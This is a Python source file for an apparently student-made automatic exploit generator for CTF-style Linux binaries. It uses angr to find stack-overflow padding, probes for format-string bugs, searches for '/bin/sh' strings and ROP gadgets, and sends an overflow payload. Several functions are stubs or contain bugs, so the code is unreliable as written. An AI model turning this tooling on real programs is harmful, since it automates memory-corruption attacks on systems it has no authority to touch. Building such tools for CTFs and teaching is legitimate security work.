import angr, claripy
import os, subprocess
import logging
import argparse

from pwn import *

logging.getLogger("angr").setLevel(logging.CRITICAL)
logging.getLogger("os").setLevel(logging.CRITICAL)


context.update(
    arch="amd64",
    endian="little",
    log_level="info",
    os="linux",
    #terminal=["tmux", "split-window", "-h", "-p 65"]
    terminal=["st"]
)

# Important lists to use
strings =  ["/bin/sh", "/bin/cat flag.txt", "flag.txt"]
exploit_functions = ["win", "system", "execve", "syscall"]
regs = ["rdi", "rsi", "rdx", "rcx", "r8", "r9"]



class rAEG:

    def __init__(self, binary_path):
        self.binary = binary_path
        self.elf = context.binary =  ELF(binary_path)
        #self.libc = context.binary = ELF(libc_path)

        self.rop_calls = []

        self.string_address = None
        self.got_overwrite_address = None

        # Create angr project
        self.proj = angr.Project(binary_path, load_options={"auto_load_libs":False})
        start_addr = self.elf.sym["main"]
        # Maybe change to symbolic file stream
        buff_size = 600
        self.symbolic_input = claripy.BVS("input", 8 * buff_size)
        self.symbolic_padding = None

        self.state = self.proj.factory.blank_state(
                addr=start_addr,
                stdin=self.symbolic_input
        )
        self.simgr = self.proj.factory.simgr(self.state, save_unconstrained=True)
        self.simgr.stashes["mem_corrupt"] = []

    # Function to check if there is a memory corruption which can lead to the instruction pointer being overwritten
    def check_mem_corruption(self, simgr):
        if len(simgr.unconstrained) > 0:
            for path in simgr.unconstrained:
                path.add_constraints(path.regs.pc == b"CCCCCCCC")
                if path.satisfiable():
                    simgr.stashes["mem_corrupt"].append(path)
                    stack_smash = path.solver.eval(self.symbolic_input, cast_to=bytes)
                    index = stack_smash.index(b"CCCCCCCC")
                    self.symbolic_padding = stack_smash[:index]
                    log.info(f"Found symbolic padding: {self.symbolic_padding}")
                    log.info(f"Takes {len(self.symbolic_padding)} bytes to smash the instruction pointer")
                simgr.stashes["unconstrained"].remove(path)
                simgr.drop(stash="active")

        return simgr

    # Use angr to explore with the check_mem_corruption function
    def stack_smash(self):
        log.info("Attempting to smash the stack")
        self.simgr.explore(step_func=self.check_mem_corruption)

        if len(self.simgr.stashes["mem_corrupt"]) <= 0:
            log.warning("Failed to smash stack")
        else:
            log.info("Successfully smashed the stack")


        return self.symbolic_padding


    # Determine which exploit we need and return which type as a string
    # Also determine the parameters needed, and the function to execute
    def find_vulnerability(self):

        # First find if it is a format string vulnerability
        p = self.start_process(None)
        p.sendline(b"%p")
        p.recvuntil(b"<<<")
        output = p.recvline()
        if b":" in output:
            output = output.split(b":")[1]

        if not b"%p" in output :
            log.info(f"[+] Found a format string vulnerability with {output}")

            # Check if win function


            # Check if pwnme symbol is present


            # Check if fopen symbol

        #else:
        self.stack_smash()

        # Find functions to use for exploit by enumerating through exploit functions

        # Find important string in the binary
        for s in strings:
            output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--string", f"{s}"])
            string_output = output.split(b"\n")[2].split(b" ")
            if len(string_output) > 1:
                self.string_address = string_output[0]
                log.info(f"Found string {s} at {self.string_address}")
                break
            # Set functions and parameters as a dictionary set
        self.find_reg_gadget("rax")
        self.find_reg_gadget("rdx")
        self.find_write_gadget()

        self.parameters = None


        return None

    # Find gadget to control register
    def find_reg_gadget(self, register):
        output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--re", f"pop {register}", "--filter", "jmp"]).split(b"\n")
        output.pop(0)
        output.pop(0)
        output.pop(-1)
        output.pop(-1)
        output.pop(-1)


        # Iterate through gadgets to find the one with the least instructions
        min_gadget = output[0]
        min_instructions = output[0].count(b";") + 1
        for gadget in output:
            instructions = gadget.count(b";")
            if instructions < min_instructions:
                min_instruction = instructions
                min_gadget = gadget

        log.info(f"Found gadget: {min_gadget}")
        print(output)
        return None



    # Find gadget to write to writable address in memory
    def find_write_gadget(self):
        output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--re", "mov .word ptr \[.*\], *."]).split(b"\n")
        output.pop(0)
        output.pop(0)
        output.pop(-1)
        output.pop(-1)
        output.pop(-1)

        # First get check to make sure that the same register isn't being dereferenced


        print(output)
        return None

    # Find writable address in binary
    def find_writable_address(self):
        return None

    # Write string to writable address in the binary
    def rop_chain_write_string(self, string):
        return None



    # Create a rop chain to execute a function call
    def rop_chain_call_function(self, function, parameters):

        chain = b""
        # If it is a syscall add pop rax, 59 for execve
        #if self.gadget_function == "syscall":
            # Get pop rax gadget or another gadget to control rax
            #break
        #for i in range(len(self.parameters)):

        chain += p64(self.elf.sym[self.gadget_function])

        return chain


    def generate_rop_chain(self):
        return None

    def start_process(self, mode):

        gs = """
            init-pwndbg
        """

        if mode == "GDB":
            return gdb.debug(self.binary, gdbscript=gs)
        elif mode == "REMOTE":
            return remote()
        else:
            return process(self.binary)

    # Function to resolve the libc base offset from the leak
    def resolve_libc_offset(self, leak):
        # Get libc base from debugger/angr

        self.libc.address

        return None

    def exploit(self):


        p = self.start_process(None)
        if self.symbolic_padding != None:
            # Check if regular rop chain or libc leak
            # If there is a leak given then parse the leak
            #
            #chain = self.generate_rop_chain_call()
            main = p64(self.elf.sym["main"])
            fini = p64(self.elf.sym["_fini"])
            p.sendline(self.symbolic_padding + fini +  main)
            p.interactive()
        # Assume that its a format challenge either format write or format leak
        else:
            # Insert leak stack function here
            p.sendline("%p")
            p.interactive()
        

if __name__ == "__main__":

    parser = argparse.ArgumentParser(
        prog = "RageAgainstTheMachine",
        description = "An automatic exploit generator using angr, ROPgadget, and pwntools",
        epilog = "Created by Stephen Brustowicz, Alex Schmith, Chandler Hake, and Matthew Brown"
    )
    parser.add_argument("bin", help="path of binary to exploit")
    #parser.add_argument("libc", help="path of libc shared object")
    args = parser.parse_args()

    rage = rAEG(args.bin)
    rage.find_vulnerability()

    rage.exploit()
